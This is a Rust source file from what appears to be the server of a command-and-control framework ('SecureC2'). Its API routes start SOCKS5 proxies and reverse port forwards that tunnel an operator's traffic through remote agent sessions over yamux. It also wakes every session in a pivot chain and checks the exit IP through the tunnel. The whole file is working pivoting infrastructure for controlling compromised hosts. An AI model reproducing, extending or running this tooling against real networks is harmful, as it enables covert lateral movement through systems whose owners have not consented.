// src/api/routes/proxies.rs
use axum::{
    extract::{Path, State},
    http::StatusCode,
    response::{IntoResponse, Response},
    Json, Extension,
};
use std::sync::Arc;
use tokio::net::TcpListener;
use tokio::sync::oneshot;
use futures::prelude::*;
use tokio_util::compat::{TokioAsyncReadCompatExt, FuturesAsyncReadCompatExt};

use crate::api::state::{ApiContext, ProxyHandle, RportfwdServerHandle};
use crate::api::models::{ProxyDto, RportfwdRequest, RportfwdDto, IpWhoIsResponse, GeoIpResult};
use crate::api::middleware::OperatorInfo;

pub async fn list_proxies(State(state): State<Arc<ApiContext>>) -> Json<Vec<ProxyDto>> {
    let proxies = state.proxies.lock().unwrap_or_else(|e| e.into_inner());
    let dtos = proxies.values().map(|p| ProxyDto {
        session_id: p.session_id,
        tunnel_port: p.tunnel_port,
        socks_port: p.socks_port,
    }).collect();
    Json(dtos)
}

pub async fn start_proxy(
    State(state): State<Arc<ApiContext>>,
    Extension(operator): Extension<OperatorInfo>,
    Path(id): Path<u32>,
) -> Response {
    if !operator.can_execute() {
        return (StatusCode::FORBIDDEN, Json(serde_json::json!({"error": "Insufficient permissions"}))).into_response();
    }

    // Auto-Tune: set sleep to 0 on the target session and every parent in the
    // pivot chain so yamux keepalives are processed promptly.
    {
        let sessions = &state.sessions;
        let mut current_node = Some(id);
        let mut chain_log = Vec::new();
        while let Some(curr_id) = current_node {
            if let Some(sess) = sessions.get(&curr_id) {
                let _ = sess.tx.send(("sleep 0 0".to_string(), None));
                chain_log.push(curr_id);
                current_node = sess.parent_id;
            } else {
                break;
            }
        }
        if !chain_log.is_empty() {
            eprintln!("[Auto-Tune] Woke up pivot chain: {:?}", chain_log);
        }
    }

    let session_tx = {
        let sessions = &state.sessions;
        match sessions.get(&id) {
            Some(s) => s.tx.clone(),
            None => return (StatusCode::NOT_FOUND, Json(serde_json::json!({"error": "Session not found"}))).into_response(),
        }
    };

    {
        let proxies = state.proxies.lock().unwrap_or_else(|e| e.into_inner());
        if proxies.contains_key(&id) {
            return (StatusCode::BAD_REQUEST, Json(serde_json::json!({"error": "Proxy already active"}))).into_response();
        }
    }

    let tunnel_listener = match TcpListener::bind("0.0.0.0:0").await {
        Ok(l) => l,
        Err(e) => return (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": e.to_string()}))).into_response(),
    };
    let socks_listener = match TcpListener::bind("127.0.0.1:0").await {
        Ok(l) => l,
        Err(e) => return (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": e.to_string()}))).into_response(),
    };

    let tunnel_port = match tunnel_listener.local_addr() {
        Ok(a) => a.port(),
        Err(e) => return (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": format!("tunnel addr: {}", e)}))).into_response(),
    };
    let socks_port = match socks_listener.local_addr() {
        Ok(a) => a.port(),
        Err(e) => return (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": format!("socks addr: {}", e)}))).into_response(),
    };

    let (stop_tx, mut stop_rx) = oneshot::channel::<()>();

    {
        let mut proxies = state.proxies.lock().unwrap_or_else(|e| e.into_inner());
        proxies.insert(id, ProxyHandle { session_id: id, tunnel_port, socks_port, stop_tx });
    }

    let _ = session_tx.send((format!("proxy:start {}", tunnel_port), None));
    let proxies_clone = state.proxies.clone();

    tokio::spawn(async move {
        eprintln!("[Proxy] Started for Session {} (Tunnel: {}, SOCKS: {})", id, tunnel_port, socks_port);

        // Wait for the agent to connect back on the tunnel port.
        let (stream, _) = tokio::select! {
            res = tunnel_listener.accept() => match res { Ok(r) => r, Err(_) => return },
            _ = &mut stop_rx => return,
        };

        // Wrap in yamux (server mode — we open streams, agent accepts them).
        let stream = Box::pin(TokioAsyncReadCompatExt::compat(stream));
        let connection = yamux::Connection::new(stream, yamux::Config::default(), yamux::Mode::Server);
        let control = connection.control();

        // ── FIX: drive the yamux runner in its own dedicated task ────────────
        //
        // Previously the runner lived in a `select!` arm:
        //   `_ = runner.next() => break`
        //
        // This is broken in two ways:
        //   1. yamux MUST be polled continuously — putting it in a select! arm
        //      means it only gets one poll per loop iteration, starving the
        //      internal event loop of ACKs and window updates.
        //   2. Any return from runner.next() (including normal control frames
        //      yamux sends on connection setup) caused the arm to fire and
        //      break the loop, dropping the connection. open_stream() then
        //      silently fails and SOCKS traffic never flows → timeout.
        //
        // Fix: spawn the runner as its own task and use a oneshot channel to
        // signal the main accept loop when the yamux connection truly dies.
        let (dead_tx, mut dead_rx) = oneshot::channel::<()>();
        tokio::spawn(async move {
            let runner = yamux::into_stream(connection);
            tokio::pin!(runner);
            // Drive yamux to completion. This processes all control frames,
            // ACKs, window updates, and keepalives. Returns when the
            // underlying TCP connection closes.
            while runner.next().await.is_some() {}
            // Signal the accept loop that the tunnel is gone.
            let _ = dead_tx.send(());
        });

        // ── Main accept loop ─────────────────────────────────────────────────
        loop {
            tokio::select! {
                // Tunnel died — clean up.
                _ = &mut dead_rx => break,

                // New SOCKS connection from the operator's tool.
                res = socks_listener.accept() => {
                    if let Ok((user_sock, _)) = res {
                        let mut ctrl = control.clone();
                        tokio::spawn(async move {
                            // Open a new yamux stream to the agent for this
                            // SOCKS connection. The agent accepts the stream
                            // and runs handle_socks5_stream() on it.
                            match ctrl.open_stream().await {
                                Ok(tun) => {
                                    let (mut ri, mut wi) = tokio::io::split(user_sock);
                                    let (mut ro, mut wo) = tokio::io::split(
                                        FuturesAsyncReadCompatExt::compat(tun),
                                    );
                                    let _ = tokio::try_join!(
                                        tokio::io::copy(&mut ri, &mut wo),
                                        tokio::io::copy(&mut ro, &mut wi),
                                    );
                                }
                                Err(e) => {
                                    eprintln!("[Proxy] open_stream failed: {} — tunnel may have closed", e);
                                }
                            }
                        });
                    }
                }

                // Manual stop from the operator.
                _ = &mut stop_rx => break,
            }
        }

        proxies_clone.lock().unwrap_or_else(|e| e.into_inner()).remove(&id);
        eprintln!("[Proxy] Stopped for Session {}", id);
    });

    (StatusCode::OK, Json(serde_json::json!({
        "status": "started",
        "tunnel_port": tunnel_port,
        "socks_port": socks_port
    }))).into_response()
}

pub async fn stop_proxy(
    State(state): State<Arc<ApiContext>>,
    Path(id): Path<u32>,
) -> Response {
    let mut proxies = state.proxies.lock().unwrap_or_else(|e| e.into_inner());
    if let Some(handle) = proxies.remove(&id) {
        let _ = handle.stop_tx.send(());
        if let Some(session) = state.sessions.get(&id) {
            let _ = session.tx.send(("proxy:stop".to_string(), None));
        }
        (StatusCode::OK, Json(serde_json::json!({"status": "stopped"}))).into_response()
    } else {
        (StatusCode::NOT_FOUND, Json(serde_json::json!({"error": "No active proxy for this session"}))).into_response()
    }
}

pub async fn check_proxy_ip(
    State(state): State<Arc<ApiContext>>,
    Path(id): Path<u32>,
) -> Response {
    let socks_port = {
        let proxies = state.proxies.lock().unwrap_or_else(|e| e.into_inner());
        match proxies.get(&id) {
            Some(p) => p.socks_port,
            None => return (StatusCode::NOT_FOUND, Json(serde_json::json!({"error": "Proxy not found"}))).into_response(),
        }
    };

    let ip_result = tokio::task::spawn_blocking(move || {
        // socks5h:// forces DNS resolution on the agent side (remote DNS).
        let proxy_url = format!("socks5h://127.0.0.1:{}", socks_port);

        let client = match reqwest::blocking::Client::builder()
            .proxy(match reqwest::Proxy::all(&proxy_url) {
                Ok(p) => p,
                Err(e) => return Err(format!("Proxy config error: {}", e)),
            })
            .timeout(std::time::Duration::from_secs(15))
            .user_agent("SecureC2/1.0")
            .build() {
                Ok(c) => c,
                Err(e) => return Err(format!("Client Build Error: {}", e)),
            };

        match client.get("https://ipwho.is/").send() {
            Ok(resp) => {
                match resp.json::<IpWhoIsResponse>() {
                    Ok(info) => {
                        if !info.success { return Err("API returned success: false".to_string()); }
                        Ok(GeoIpResult {
                            ip: info.ip,
                            country: info.country,
                            country_code: info.country_code,
                            city: info.city,
                            isp: info.connection.isp,
                        })
                    },
                    Err(e) => Err(format!("JSON Parse Error: {}", e)),
                }
            },
            Err(e) => Err(format!("Unreachable: {}", e)),
        }
    }).await.unwrap_or(Err("Task Join Error".to_string()));

    match ip_result {
        Ok(info) => (StatusCode::OK, Json(info)).into_response(),
        Err(e) => (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": e}))).into_response(),
    }
}

// ── Reverse Port Forwarding ────────────────────────────────────────────

pub async fn list_rportfwds(State(state): State<Arc<ApiContext>>) -> Json<Vec<RportfwdDto>> {
    let rportfwds = state.rportfwds.lock().unwrap_or_else(|e| e.into_inner());
    let dtos = rportfwds.values().map(|r| RportfwdDto {
        session_id: r.session_id,
        bind_port: r.bind_port,
        target_host: r.target_host.clone(),
        target_port: r.target_port,
    }).collect();
    Json(dtos)
}

pub async fn start_rportfwd(
    State(state): State<Arc<ApiContext>>,
    Extension(operator): Extension<OperatorInfo>,
    Path(id): Path<u32>,
    Json(payload): Json<RportfwdRequest>,
) -> Response {
    if !operator.can_execute() {
        return (StatusCode::FORBIDDEN, Json(serde_json::json!({"error": "Insufficient permissions"}))).into_response();
    }

    if payload.bind_port == 0 || payload.target_port == 0 || payload.target_host.is_empty() {
        return (StatusCode::BAD_REQUEST, Json(serde_json::json!({"error": "Invalid bind_port, target_host, or target_port"}))).into_response();
    }

    {
        let rportfwds = state.rportfwds.lock().unwrap_or_else(|e| e.into_inner());
        if rportfwds.contains_key(&(id, payload.bind_port)) {
            return (StatusCode::BAD_REQUEST, Json(serde_json::json!({"error": "rportfwd already active on this port"}))).into_response();
        }
    }

    let session_tx = {
        let sessions = &state.sessions;
        match sessions.get(&id) {
            Some(s) => s.tx.clone(),
            None => return (StatusCode::NOT_FOUND, Json(serde_json::json!({"error": "Session not found"}))).into_response(),
        }
    };

    let bind_listener = match TcpListener::bind(format!("0.0.0.0:{}", payload.bind_port)).await {
        Ok(l) => l,
        Err(e) => return (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": format!("Failed to bind port {}: {}", payload.bind_port, e)}))).into_response(),
    };

    let tunnel_listener = match TcpListener::bind("0.0.0.0:0").await {
        Ok(l) => l,
        Err(e) => return (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": format!("Failed to bind tunnel port: {}", e)}))).into_response(),
    };
    let tunnel_port = match tunnel_listener.local_addr() {
        Ok(a) => a.port(),
        Err(e) => return (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({"error": format!("tunnel addr: {}", e)}))).into_response(),
    };

    let (stop_tx, mut stop_rx) = oneshot::channel::<()>();

    {
        let mut rportfwds = state.rportfwds.lock().unwrap_or_else(|e| e.into_inner());
        rportfwds.insert((id, payload.bind_port), RportfwdServerHandle {
            session_id: id,
            bind_port: payload.bind_port,
            tunnel_port,
            target_host: payload.target_host.clone(),
            target_port: payload.target_port,
            stop_tx,
        });
    }

    let _ = session_tx.send((
        format!("rportfwd:start {} {} {}", tunnel_port, payload.target_host, payload.target_port),
        None,
    ));

    let rportfwds_clone = state.rportfwds.clone();
    let bind_port = payload.bind_port;
    // Clone before the spawn so target_desc_for_response is still available
    // for the JSON return value below — async move would otherwise consume it.
    let target_desc_for_response = format!("{}:{}", payload.target_host, payload.target_port);
    let target_desc_for_spawn   = target_desc_for_response.clone();

    tokio::spawn(async move {
        let target_desc = target_desc_for_spawn;
        eprintln!("[rportfwd] Started for Session {} (bind:{}, tunnel:{}, target:{})",
            id, bind_port, tunnel_port, target_desc);

        let (stream, _) = tokio::select! {
            res = tunnel_listener.accept() => match res { Ok(r) => r, Err(_) => return },
            _ = &mut stop_rx => return,
        };

        let stream = Box::pin(TokioAsyncReadCompatExt::compat(stream));
        let connection = yamux::Connection::new(stream, yamux::Config::default(), yamux::Mode::Server);
        let control = connection.control();

        // Same fix as proxy: drive yamux runner in its own task.
        let (dead_tx, mut dead_rx) = oneshot::channel::<()>();
        tokio::spawn(async move {
            let runner = yamux::into_stream(connection);
            tokio::pin!(runner);
            while runner.next().await.is_some() {}
            let _ = dead_tx.send(());
        });

        loop {
            tokio::select! {
                _ = &mut dead_rx => break,

                res = bind_listener.accept() => {
                    if let Ok((client_sock, peer)) = res {
                        eprintln!("[rportfwd] Connection from {} on bind port {}", peer, bind_port);
                        let mut ctrl = control.clone();
                        tokio::spawn(async move {
                            match ctrl.open_stream().await {
                                Ok(tun) => {
                                    let (mut ri, mut wi) = tokio::io::split(client_sock);
                                    let (mut ro, mut wo) = tokio::io::split(
                                        FuturesAsyncReadCompatExt::compat(tun),
                                    );
                                    let _ = tokio::try_join!(
                                        tokio::io::copy(&mut ri, &mut wo),
                                        tokio::io::copy(&mut ro, &mut wi),
                                    );
                                }
                                Err(e) => {
                                    eprintln!("[rportfwd] open_stream failed: {}", e);
                                }
                            }
                        });
                    }
                }

                _ = &mut stop_rx => break,
            }
        }

        rportfwds_clone.lock().unwrap_or_else(|e| e.into_inner()).remove(&(id, bind_port));
        eprintln!("[rportfwd] Stopped for Session {} bind port {}", id, bind_port);
    });

    (StatusCode::OK, Json(serde_json::json!({
        "status": "started",
        "bind_port": bind_port,
        "tunnel_port": tunnel_port,
        "target": target_desc_for_response,
    }))).into_response()
}

pub async fn stop_rportfwd(
    State(state): State<Arc<ApiContext>>,
    Path(id): Path<u32>,
    Json(payload): Json<serde_json::Value>,
) -> Response {
    let bind_port = payload.get("bind_port")
        .and_then(|v| v.as_u64())
        .map(|v| v as u16)
        .unwrap_or(0);

    if bind_port == 0 {
        return (StatusCode::BAD_REQUEST, Json(serde_json::json!({"error": "bind_port required"}))).into_response();
    }

    let mut rportfwds = state.rportfwds.lock().unwrap_or_else(|e| e.into_inner());
    if let Some(handle) = rportfwds.remove(&(id, bind_port)) {
        let _ = handle.stop_tx.send(());
        if let Some(session) = state.sessions.get(&id) {
            let _ = session.tx.send((format!("rportfwd:stop {}", handle.tunnel_port), None));
        }
        (StatusCode::OK, Json(serde_json::json!({"status": "stopped"}))).into_response()
    } else {
        (StatusCode::NOT_FOUND, Json(serde_json::json!({"error": "No active rportfwd on this port"}))).into_response()
    }
}
